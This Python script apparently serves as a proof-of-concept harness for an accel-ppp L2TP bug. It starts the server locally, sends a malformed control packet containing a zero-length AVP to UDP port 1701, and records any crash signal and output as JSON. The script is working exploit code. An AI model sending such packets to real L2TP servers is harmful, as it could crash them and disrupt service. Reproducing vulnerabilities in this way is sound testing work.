#!/usr/bin/env python3

import argparse
import json
import os
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time
from pathlib import Path


TARGET_HOST = "127.0.0.1"
TARGET_PORT = 1701
OUTPUT_LIMIT = 20000


def build_payload():
    header_flags = 0xC002
    packet_length = 14
    tunnel_id = 0
    session_id = 0
    avp_flags = 0x8000
    avp_length = 0
    vendor_id = 0
    avp_type = 0

    return (
        struct.pack("!HHHH", header_flags, packet_length, tunnel_id, session_id)
        + struct.pack("!HHHH", avp_flags, avp_length, vendor_id, avp_type)
    )


def build_config(directory):
    config_path = directory / "accel-ppp.conf"
    error_log = directory / "accel-ppp-error.log"
    config_path.write_text(
        "[modules]\n"
        "path=lib64/accel-ppp\n"
        "l2tp\n\n"
        "[core]\n"
        f"log-error={error_log}\n"
        "thread-count=1\n\n"
        "[ppp]\n"
        "verbose=1\n\n"
        "[l2tp]\n"
        "verbose=1\n"
        f"bind={TARGET_HOST}\n",
        encoding="utf-8",
    )
    return config_path


def udp_port_is_listening(port):
    for proc_path in (Path("/proc/net/udp"), Path("/proc/net/udp6")):
        try:
            lines = proc_path.read_text(encoding="ascii").splitlines()[1:]
        except OSError:
            continue
        for line in lines:
            fields = line.split()
            if len(fields) < 2:
                continue
            try:
                local_port = int(fields[1].rsplit(":", 1)[1], 16)
            except (ValueError, IndexError):
                continue
            if local_port == port:
                return True
    return False


def wait_for_listener(process, timeout):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if process.poll() is not None:
            return False
        if udp_port_is_listening(TARGET_PORT):
            return True
        time.sleep(0.05)
    return udp_port_is_listening(TARGET_PORT)


def decode_output(data):
    return data.decode("utf-8", errors="replace") if data is not None else ""


def truncate(value, limit=OUTPUT_LIMIT):
    if len(value) <= limit:
        return value
    return value[:limit] + "\n...[truncated]"


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return None


def make_result(binary, command, returncode, timed_out, stdout, stderr, error):
    combined = stdout
    if stderr:
        combined += ("\n" if combined else "") + stderr
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": 0,
        "stdout": truncate(stdout),
        "stderr": truncate(stderr),
        "observable": {
            "kind": "combined_output",
            "value": truncate(combined),
            "path": None,
        },
        "error": error,
    }


def stop_process(process):
    if process is None or process.poll() is not None:
        return
    try:
        os.killpg(process.pid, signal.SIGKILL)
    except (OSError, ProcessLookupError):
        pass


def run(binary, timeout):
    binary_path = Path(binary).expanduser()
    try:
        binary_path = binary_path.resolve(strict=True)
    except OSError as error:
        return make_result(
            str(binary),
            [str(binary), "--no-sigsegv"],
            None,
            False,
            "",
            "",
            str(error),
        )

    working_directory = binary_path.parent.parent
    if not working_directory.is_dir():
        message = f"working directory does not exist: {working_directory}"
        return make_result(
            str(binary),
            [str(binary), "--no-sigsegv"],
            None,
            False,
            "",
            "",
            message,
        )

    process = None
    command = [str(binary_path), "--no-sigsegv", "<dynamic>"]
    started = time.monotonic()
    timed_out = False
    stdout = ""
    stderr = ""
    returncode = None
    error = None

    try:
        with tempfile.TemporaryDirectory(prefix="accel-ppp-poc-") as temporary_directory:
            config_path = build_config(Path(temporary_directory))
            command = [str(binary_path), "--no-sigsegv", "-c", str(config_path)]
            process = subprocess.Popen(
                command,
                cwd=working_directory,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
            )
            wait_for_listener(process, min(2.0, timeout))

            if process.poll() is None:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
                    client.sendto(build_payload(), (TARGET_HOST, TARGET_PORT))

            try:
                stdout_data, stderr_data = process.communicate(
                    timeout=max(0.0, timeout - (time.monotonic() - started))
                )
            except subprocess.TimeoutExpired:
                timed_out = True
                stop_process(process)
                stdout_data, stderr_data = process.communicate()

            stdout = decode_output(stdout_data)
            stderr = decode_output(stderr_data)
            returncode = process.returncode
    except Exception as caught:
        error = str(caught)
        stop_process(process)
        if process is not None:
            try:
                stdout_data, stderr_data = process.communicate(timeout=1)
                stdout = decode_output(stdout_data)
                stderr = decode_output(stderr_data)
            except (subprocess.TimeoutExpired, OSError):
                pass
            returncode = process.returncode

    result = make_result(
        str(binary_path),
        command,
        returncode,
        timed_out,
        stdout,
        stderr,
        error,
    )
    result["runtime_ms"] = round((time.monotonic() - started) * 1000)
    return result


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=10.0)
    return parser.parse_args()


def main():
    args = parse_args()
    result = run(args.binary, max(0.0, args.timeout))
    rendered = json.dumps(result, indent=2)
    if args.json_out:
        Path(args.json_out).write_text(rendered + "\n", encoding="utf-8")
    else:
        print(rendered)
    return 0


if __name__ == "__main__":
    sys.exit(main())
